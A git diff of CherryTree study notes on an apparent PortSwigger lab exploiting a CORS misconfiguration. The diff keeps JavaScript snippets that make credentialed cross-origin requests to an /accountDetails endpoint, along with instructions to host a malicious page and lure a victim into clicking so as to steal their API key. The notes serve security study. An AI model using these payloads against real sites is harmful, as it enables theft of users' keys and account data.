@@ -1,17 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
-  <node unique_id="31" master_id="0" name="Basic (CORS: True)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747502901" ts_lastsave="1747505793">
-    <rich_text>Check how u receive the data - here with a get to /accountDetails
-</rich_text>
-    <rich_text justification="left"></rich_text>
+  <node unique_id="31" master_id="0" name="Basic (CORS: True)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1747502901" ts_lastsave="1747505892">
     <rich_text>
-
-Send to repeater and try to add the Origin header and see if still works to see if vuln.
-Origin: whatever.com
-</rich_text>
-    <rich_text justification="left"></rich_text>
-    <rich_text>
-
 Create a maliciouse homepage and host it -&gt; make sure it includes javascript code to fetch the api key:
 &#13;
 </rich_text>
@@ -28,9 +18,7 @@ OR maybe simpler script:
 Host webpage -&gt; send to victim -&gt; if he clicks it u get his key. 
 
 </rich_text>
-    <encoded_png char_offset="66" justification="left" link="" sha256sum="8e1ac99a9bbfb4cec9ba273ce79a8f85faa70863ae3adb0841290979f0e925bc"/>
-    <encoded_png char_offset="179" justification="left" link="" sha256sum="006ced60c75426c37c9e04f1c3e52d8d25c49d8ddb4b77e0b856b9a75bc5bd37"/>
-    <codebox char_offset="288" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="0">&lt;script&gt;&#13;
+    <codebox char_offset="107" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="0">&lt;script&gt;&#13;
     const request =  new XMLHttpRequest()&#13;
     request.open("get", "https://0a6900fb0387476b80430358009000b2.web-security-academy.net/accountDetails", true)&#13;
     request.onload = ()=&gt;{&#13;
@@ -39,7 +27,7 @@ Host webpage -&gt; send to victim -&gt; if he clicks it u get his key.
     request.withCredentials = true&#13;
     request.send()&#13;
 &lt;/script&gt;</codebox>
-    <codebox char_offset="317" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="0">&lt;script&gt;
+    <codebox char_offset="136" justification="left" frame_width="1971" frame_height="100" width_in_pixels="1" syntax_highlighting="js" highlight_brackets="1" show_line_numbers="0">&lt;script&gt;
 var req = new XMLHttpRequest();&#13;
 req.onload = reqListener;&#13;
 req.open('get','https://vulnerable-website.com/sensitive-victim-data',true);&#13;
